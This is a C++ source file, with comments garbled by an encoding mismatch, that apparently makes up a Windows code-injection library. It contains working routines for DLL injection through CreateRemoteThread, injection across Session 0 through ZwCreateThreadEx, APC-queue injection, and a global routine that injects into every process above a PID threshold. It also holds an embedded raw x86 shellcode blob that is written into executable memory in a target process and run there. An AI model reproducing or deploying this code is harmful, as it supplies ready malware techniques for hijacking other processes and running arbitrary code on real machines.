#include "stdafx.h"
#include <tchar.h>
#include "InjectCode.h"
#include <TlHelp32.h>

// ������ʾ
void ShowError(const wchar_t* szBuf)
{
	::MessageBoxW(0, szBuf, L"������ʾ", 0);
}
// ȫ�ֵ�һע��
void Inject(const wchar_t* dllPath, DWORD dwPid)
{
	//���ֽڵĳ���Ҫע��һ��
	DWORD dwBufSize = (DWORD)(_tcslen(dllPath) + 1) * sizeof(wchar_t);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	CString szPid = {};
	if (!hProcess) {
		szPid.Format(L"�򿪽���ʧ��PID:%d ������%d\n", dwPid, GetLastError);
		OutputDebugString(szPid);
		return;
	}

	//�ڱ�ע��Ľ����з���һ�������ڴ�
	LPVOID lpAddr = VirtualAllocEx(hProcess,
		NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);
	if (!lpAddr) {		
		szPid.Format(L"PID:%d�����ڴ�ʧ�� ������%d\n", dwPid, GetLastError);
		OutputDebugString(szPid);
		return;
	}

	//��dll·��ע�뵽Ŀ�������
	SIZE_T dwWrite = 0;
	WriteProcessMemory(hProcess, lpAddr,
		(LPCVOID)dllPath, dwBufSize, &dwWrite);
	if (dwBufSize != dwWrite)
	{		
		szPid.Format(L"PID:%d dll·��д��ʧ�� ������%d\n", dwPid, GetLastError);
		OutputDebugString(szPid);
		return;
	}

	//����Զ���߳�
	HANDLE hThread = CreateRemoteThread(hProcess, 0, 0,
		LPTHREAD_START_ROUTINE(LoadLibraryW), lpAddr, 0, 0);
	if (!hThread)
	{		
		szPid.Format(L"PID:%d ����Զ���߳�ʧ�� ������%d\n", dwPid, GetLastError);
		OutputDebugString(szPid);
		return;
	}

	//�ȴ��߳̽���
	//WaitForSingleObject(hThread, INFINITE);
	//VirtualFreeEx(hProcess, lpAddr, MAX_PATH, MEM_RESERVE);
	//CloseHandle(hThread);
	CloseHandle(hProcess);
}
// ȫ�ֵ�һж��
void Enject(const wchar_t* dllPath, DWORD dwPid)
{
	MODULEENTRY32 me = { sizeof(MODULEENTRY32) };
	//����ÿ�����̵�ģ��
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPid);
	if (INVALID_HANDLE_VALUE == hSnap)
		return;
	bool bOK = false;
	Module32First(hSnap, &me);
	do
	{
		if (!_tcsicmp(me.szModule, dllPath) ||
			!_tcsicmp(me.szExePath, dllPath))
		{
			bOK = true;
			break;
		}

	} while (Module32Next(hSnap, &me));

	if (!bOK) {
		CloseHandle(hSnap);
		return;
	}

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess) {
		CloseHandle(hSnap);
		return;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, 0, 0,
		(LPTHREAD_START_ROUTINE)FreeLibrary, me.modBaseAddr, 0, 0);

	//WaitForSingleObject(hThread, INFINITE);
	//CloseHandle(hThread);
	CloseHandle(hProcess);
	CloseHandle(hSnap);
}



// Զ���߳�ע��
BOOL RemoteInjectDll(DWORD dwPid, const char* DllPath)
{	
	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess)
	{		
		ShowError(L"����PID�򿪳���ʧ�ܣ�");
		return FALSE;
	}

	//��ע��Ľ����з���һ�������ڴ�
	LPVOID lpAddr = ::VirtualAllocEx(hProcess,
		NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
	if (!lpAddr)
	{
		ShowError(L"���������ڴ�ʧ�ܣ�");
		::CloseHandle(hProcess);
		return FALSE;
	}

	//��dll·��д�뵽Ŀ����̿ռ���
	SIZE_T dwWrite = 0;
	::WriteProcessMemory(hProcess, lpAddr, DllPath,
		strlen(DllPath) + 1, &dwWrite);
	if (strlen(DllPath) + 1 != dwWrite)
	{
		ShowError(L"DLLд����̿ռ���ʧ�ܣ�");
		::VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);
		::CloseHandle(hProcess);
		return FALSE;
	}

	//����Զ���߳�
	HANDLE hThread = ::CreateRemoteThread(hProcess, 0, 0,
		(LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddr, 0, 0);
	if (!hThread)
	{
		ShowError(L"����Զ���߳�ʧ�ܣ�");
		::VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);
		::CloseHandle(hProcess);
		return FALSE;
	}

	//�ȴ��߳̽���(��������)
	//::WaitForSingleObject(hThread, INFINITE);

	//�ͷ�
	//::VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);
	//::CloseHandle(hThread);
	::CloseHandle(hProcess);
	
	return TRUE;
}

// ͻ��SESSION0�����Զ���߳�ע��
void AcrossSession0(DWORD dwPid, const char* DllPath)
{
	HANDLE hProcess = NULL;
	SIZE_T dwSize = 0;
	LPVOID pDllAddr = NULL;
	FARPROC pFuncProcAddr = NULL;
	HANDLE hRemoteThread = NULL;
	DWORD dwStatus = 0;

	// ��ע����̣���ȡ���̾��
	hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (NULL == hProcess)
	{
		ShowError(L"��Ŀ�����ʧ�ܣ�");
		return;
	}
	// ��ע������������ڴ�
	dwSize = 1 + strlen(DllPath);
	pDllAddr = ::VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	if (NULL == pDllAddr)
	{
		ShowError(L"���������ڴ�ʧ�ܣ�");
		return;
	}
	// ��������ڴ���д������
	if (FALSE == ::WriteProcessMemory(hProcess, pDllAddr, DllPath, dwSize, NULL))
	{
		ShowError(L"��������ڴ���д������ʧ�ܣ�");
		return;
	}
	// ���� ntdll.dll
	HMODULE hNtdllDll = ::LoadLibraryA("ntdll.dll");
	if (NULL == hNtdllDll)
	{
		ShowError(L"����ntdll.dllʧ�ܣ�");
		return;
	}

	// ��ȡZwCreateThread������ַ
#ifdef _WIN64
	typedef DWORD(WINAPI *typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		ULONG CreateThreadFlags,
		SIZE_T ZeroBits,
		SIZE_T StackSize,
		SIZE_T MaximumStackSize,
		LPVOID pUnkown);
#else
	typedef DWORD(WINAPI *typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		BOOL CreateSuspended,
		DWORD dwStackSize,
		DWORD dw1,
		DWORD dw2,
		LPVOID pUnkown);
#endif
	typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::GetProcAddress(hNtdllDll, "ZwCreateThreadEx");
	if (NULL == ZwCreateThreadEx)
	{
		ShowError(L"��ȡZwCreateThreadEx������ַʧ�ܣ�");
		return;
	}
	// ʹ�� ZwCreateThreadEx ����Զ�߳�, ʵ�� DLL ע��
	dwStatus = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)LoadLibraryA, pDllAddr, 0, 0, 0, 0, NULL);
	if (NULL == hRemoteThread)
	{
		ShowError(L"ZwCreateThreadEx����Զ���߳�ʧ�ܣ�");
		return;
	}
	
	// �ͷ���رվ��
	::CloseHandle(hProcess);
	::FreeLibrary(hNtdllDll);		
		
}

// APCע��
void APCInject(DWORD dwPid, const char* DllPath)
{	
	
	DWORD* pTid = NULL;
	DWORD dwTidNum = 0;

	// ����PID��ȡ�ý�������TID   
	GetAllTidByPid(dwPid, &pTid, &dwTidNum);

	// ��ע�����
	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess)
	{
		ShowError(L"��Ŀ�����ʧ�ܣ�");
		return;
	}

	SIZE_T siDllLength = 1 + ::strlen(DllPath);
	// �ڸý������������ڴ�
	PVOID pBaseAddr = ::VirtualAllocEx(hProcess, NULL, siDllLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pBaseAddr)
	{
		ShowError(L"���������ڴ�ʧ�ܣ�");
		CloseHandle(hProcess);
		delete[] pTid;
		return;
	}

	SIZE_T dwSize = 0;
	// ������Ŀռ���д��DLL·������
	::WriteProcessMemory(hProcess, pBaseAddr, DllPath, siDllLength, &dwSize);

	HANDLE hThread = NULL;
	// �����̣߳�����APC
	for (DWORD i = 0; i < dwTidNum; i++)
	{
		hThread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, pTid[i]);
		if (hThread)
		{
			// ����APC
			DWORD dwQue = ::QueueUserAPC((PAPCFUNC)LoadLibraryA, hThread, (ULONG_PTR)pBaseAddr);
			::CloseHandle(hThread);
			hThread = NULL;
		}
	}

	// �ͷ�
	CloseHandle(hProcess);
	delete[] pTid;		
}

// ����PID��ȡ�ý�������TID   
BOOL GetAllTidByPid(DWORD dwPid, DWORD** ppTid, DWORD* pTidNum)
{
	DWORD* pTid = NULL;
	DWORD dwBufferLength = 1000;
	// ������ڴ�
	pTid = new DWORD[dwBufferLength];
	if (!pTid)
		return FALSE;
	::RtlZeroMemory(pTid, dwBufferLength * sizeof(DWORD));

	// �����߳̿���
	HANDLE hSnapshot = NULL;
	THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
	hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (!hSnapshot)
		return FALSE;

	DWORD dwThreadNum = 0;
	// �����߳̿���
	if (::Thread32First(hSnapshot, &te32))
	{
		do
		{
			if (te32.th32OwnerProcessID == dwPid)
			{
				pTid[dwThreadNum] = te32.th32ThreadID;
				++dwThreadNum;
			}
		} while (::Thread32Next(hSnapshot, &te32));
	}

	// ���
	*ppTid = pTid;
	*pTidNum = dwThreadNum;

	return TRUE;
}

// ж��DLL
BOOL UnloadDll(DWORD dwPid, LPCTSTR szDllName) 
{
	BOOL bMore = FALSE, bFound = FALSE;

	MODULEENTRY32 me = { sizeof(MODULEENTRY32) };
	HANDLE hSnapModule = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPid);

	bMore = ::Module32First(hSnapModule, &me);
	while (bMore)
	{
		if (!_tcsicmp((LPCTSTR)me.szModule, szDllName) ||
			!_tcsicmp((LPCTSTR)me.szExePath, szDllName)) {
			bFound = TRUE;
			break;
		}
		bMore = ::Module32Next(hSnapModule, &me);
	}
	if (!bFound) 
	{
		ShowError(L"û���ҵ���ģ��!");
		CloseHandle(hSnapModule);
		return FALSE;
	}

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess) 
	{
		ShowError(L"��Ŀ�����ʧ��!");		
		return FALSE;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, 0, 0,
		(LPTHREAD_START_ROUTINE)FreeLibrary, me.modBaseAddr, 0, 0);
	if (!hThread) 
	{
		ShowError(L"����Զ���߳�ʧ��!");
		return FALSE;
	}

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	CloseHandle(hSnapModule);
	return TRUE;
}

// ȫ��ע��
void GlobalInject(const wchar_t* DllPath, BOOL InjectOrUnLoad)
{
	//����һ�����̿���
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	pe.dwSize = sizeof(PROCESSENTRY32);
	DWORD dwPid = 0;
	DWORD dwCurrentPid = GetCurrentProcessId();
	//��������
	if (TRUE == Process32First(hSnap, &pe))
	{
		do
		{			
			// IDС��1000��������ϵͳ����
			if (pe.th32ProcessID > 980)
			{
				dwPid = pe.th32ProcessID;
				if (InjectOrUnLoad)
				{
					// ��ע���Լ����������
					if (pe.th32ProcessID != dwCurrentPid)					
						Inject(DllPath, dwPid);
				}
				else
					Enject(DllPath, dwPid);
			}
		} while (Process32Next(hSnap, &pe));
	}
	CloseHandle(hSnap);
}


struct MyStruct
{

};

// ������������ ���ҹرձ����̵Ĺ�������
char ShellCode[] = \
"\x60\x83\xEC\x60\xEB\x2E\x6E\x74\x64\x6C\x6C\x2E\x64\x6C\x6C\x00\x4C\x6F\x61\x64" \
"\x4C\x69\x62\x72\x61\x72\x79\x45\x78\x41\x00\x75\x73\x65\x72\x33\x32\x2E\x64\x6C" \
"\x6C\x00\x5D\x4E\x33\x96\x53\x90\xBA\x4E\x00\x00\xD9\xEE\xD9\x74\x24\xF4\x5A\x64" \
"\x8B\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\x8B\x36\x8B\x5E\x08\x68\x85\xDF" \
"\xAF\xBB\x53\xE8\xB1\x00\x00\x00\x8B\xC8\x51\x52\x8D\x52\xDC\x52\x53\xFF\xD1\x5A" \
"\x59\x52\x50\x53\xE8\x01\x00\x00\x00\x61\x55\x8B\xEC\x83\xEC\x0C\x8B\x55\x10\x33" \
"\xC9\x8D\x72\xEB\x51\x51\x56\xFF\x55\x0C\x68\x80\x0A\x38\x1E\x50\xE8\x7C\x00\x00" \
"\x00\x33\xC9\x8B\x55\x10\x8D\x5A\xF6\x51\x53\x53\x51\xFF\xD0\x8B\x55\x10\x8D\x5A" \
"\xD2\x33\xC9\x51\x51\x53\xFF\x55\x0C\x68\x6B\xC8\xEB\x09\x50\xE8\x55\x00\x00\x00" \
"\x33\xC9\x51\xFF\xD0\x8B\xE5\x5D\xC2\x10\x00\xC8\x00\x00\x00\x83\xEC\x04\x53\x51" \
"\x52\xC7\x45\xFC\x00\x00\x00\x00\x33\xC0\x33\xC9\x8B\x75\x08\x8A\x04\x0E\x84\xC0" \
"\x74\x16\x8B\x7D\xFC\xC1\xE7\x19\x8B\x55\xFC\xC1\xEA\x07\x0B\xFA\x03\xF8\x89\x7D" \
"\xFC\x41\xEB\xE3\x8B\x75\x0C\x3B\xFE\xB8\x01\x00\x00\x00\x74\x02\x33\xC0\x5A\x59" \
"\x5B\xC9\xC2\x08\x00\x55\x8B\xEC\x83\xEC\x0C\x52\x53\x8B\x55\x08\x8B\x72\x3C\x8D" \
"\x34\x32\x8B\x76\x78\x8D\x34\x32\x8B\x7E\x1C\x8D\x3C\x3A\x89\x7D\xFC\x8B\x7E\x20" \
"\x8D\x3C\x3A\x89\x7D\xF8\x8B\x7E\x24\x8D\x3C\x3A\x89\x7D\xF4\x33\xC9\xEB\x01\x41" \
"\x8B\x75\xF8\x8B\x34\x8E\x8D\x34\x32\xFF\x75\x0C\x56\xE8\x6D\xFF\xFF\xFF\x85\xC0" \
"\x74\xE9\x8B\x75\xF4\x33\xDB\x66\x8B\x1C\x4E\x8B\x75\xFC\x8B\x34\x9E\x8D\x04\x32" \
"\x5B\x5A\x8B\xE5\x5D\xC2\x08\x00";

// ����ע��
void InjectCode(DWORD dwPid)
{
	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess)
	{
		ShowError(L"����PID�򿪳���ʧ�ܣ�");
		return;
	}

	//��ע��Ľ����з���һ�������ڴ�	
	LPVOID lpAddr = ::VirtualAllocEx(hProcess,
		NULL, sizeof(ShellCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpAddr)
	{
		ShowError(L"���������ڴ�ʧ�ܣ�");
		::CloseHandle(hProcess);
		return;
	}

	//��dll·��д�뵽Ŀ����̿ռ���
	SIZE_T dwWrite = 0;
	::WriteProcessMemory(hProcess, lpAddr, (LPCVOID)&ShellCode,
		sizeof(ShellCode), &dwWrite);
	if (sizeof(ShellCode) != dwWrite)
	{
		ShowError(L"DLLд����̿ռ���ʧ�ܣ�");
		::VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);
		::CloseHandle(hProcess);
		return;
	}

	//����Զ���߳�
	HANDLE hThread = ::CreateRemoteThread(hProcess, 0, 0,
		(LPTHREAD_START_ROUTINE)lpAddr, nullptr, 0, 0);
	if (!hThread)
	{
		ShowError(L"����Զ���߳�ʧ�ܣ�");
		::VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);
		::CloseHandle(hProcess);
		return;
	}			

	::CloseHandle(hThread);
	::CloseHandle(hProcess);
}
